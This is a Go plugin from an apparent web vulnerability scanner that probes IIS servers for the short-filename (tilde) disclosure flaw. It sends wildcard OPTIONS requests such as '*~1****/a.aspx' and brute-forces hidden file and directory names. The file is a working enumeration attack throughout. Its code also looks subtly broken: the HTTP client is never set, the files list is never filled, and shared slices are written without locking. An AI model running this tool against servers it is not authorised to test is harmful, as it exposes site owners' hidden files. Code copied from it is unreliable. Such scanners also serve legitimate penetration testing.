package iis

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/input"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/output"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/ChYing/pkg/Jie/pkg/util"
	"github.com/yhy0/logging"
	"net/url"
	"strings"
	"sync"
	"time"
)

/**
   @author yhy
   @since 2023/9/11
   @desc iis高版本短文件名猜解脚本，适用于iis7.5~10.x版本的iis中间件。
    https://github.com/abc123info/iis7.5-10.x-ShortNameFuzz
**/

type Scanner struct {
	target    *url.URL
	payloads  []string
	files     []string
	dirs      []string
	queue     chan string
	client    *httpx.Client
	lock      sync.Mutex
	waitGroup sync.WaitGroup
}

func NewScanner(target string) (*Scanner, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}
	if u.Path[len(u.Path)-1:] != "/" {
		u.Path += "/"
	}
	payloads := strings.Split("abcdefghijklmnopqrstuvwxyz0123456789_-", "")
	return &Scanner{
		target:   u,
		payloads: payloads,
		queue:    make(chan string, 100),
	}, nil
}

func (s *Scanner) getStatus(path string) int {
	u := *s.target
	u.Path += path
	for i := 0; i < 3; i++ {
		resp, err := s.client.Request(u.String(), "OPTIONS", "", nil, "IIS")
		if err != nil {
			continue
		}
		return resp.StatusCode
	}
	return 0
}

func (s *Scanner) IsVul() bool {
	status1 := s.getStatus("*~1****/a.aspx")
	status2 := s.getStatus("/l1j1e*~1****/a.aspx")
	return status1 == 404 && status2 == 200
}

func (s *Scanner) Run() {
	for _, payload := range s.payloads {
		s.queue <- s.target.Path + payload
	}
	for i := 0; i < 10; i++ {
		s.waitGroup.Add(1)
		go s.scanWorker()
	}
	s.waitGroup.Wait()
}

func (s *Scanner) Report() {
	if len(s.files) > 0 {
		output.OutChannel <- output.VulMessage{
			DataType: "web_vul",
			Plugin:   "IIS",
			VulnData: output.VulnData{
				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
				Target:     s.target.String(),
				Method:     "OPTIONS",
				Ip:         "",
				Param:      "",
				Payload:    strings.Join(s.files, ", "),
			},
			Level: output.Medium,
		}
		logging.Logger.Printf("%d Directories, %d Files found in total\nDirs: %v \nFile: %v\n", len(s.dirs), len(s.files), s.dirs, s.files)
	}

}

func (s *Scanner) scanWorker() {
	defer s.waitGroup.Done()
	for {
		select {
		case path, ok := <-s.queue:
			if !ok {
				return
			}
			status := s.getStatus(path + "*~1****/1.aspx")
			if status == 404 {
				logging.Logger.Println("Found " + path + "****" + "\t[scan in progress]")
				if len(path)-len(s.target.Path) < 6 {
					for _, payload := range s.payloads {
						s.queue <- path + payload
					}
				} else {
					s.dirs = append(s.dirs, path+"~1")
					logging.Logger.Println("Found Dir " + path + "~1\t[Done]")
				}
			}
		case <-time.After(6 * time.Second):
			return
		}
	}
}

type Plugin struct {
	SeenRequests sync.Map
}

func (p *Plugin) Name() string {
	return "iis"
}

func (p *Plugin) Scan(target string, path string, in *input.CrawlResult, client *httpx.Client) {
	if p.IsScanned(in.UniqueId) {
		return
	}

	// 这里应该根据指纹来搞，识别到了指纹才进行 Fuzz
	if !util.InSliceCaseFold("ASP", in.Fingerprints) {
		return
	}

	s, err := NewScanner(target)

	if err != nil {
		logging.Logger.Println("Error:", err)
		return
	}

	if !s.IsVul() {
		logging.Logger.Println("Sorry, server is not vulnerable")
		return
	}

	logging.Logger.Println("Server is vulnerable, please wait, scanning...")
	s.Run()
	s.Report()
}

func (p *Plugin) IsScanned(key string) bool {
	if key == "" {
		return false
	}
	if _, ok := p.SeenRequests.Load(key); ok {
		return true
	}
	p.SeenRequests.Store(key, true)
	return false
}
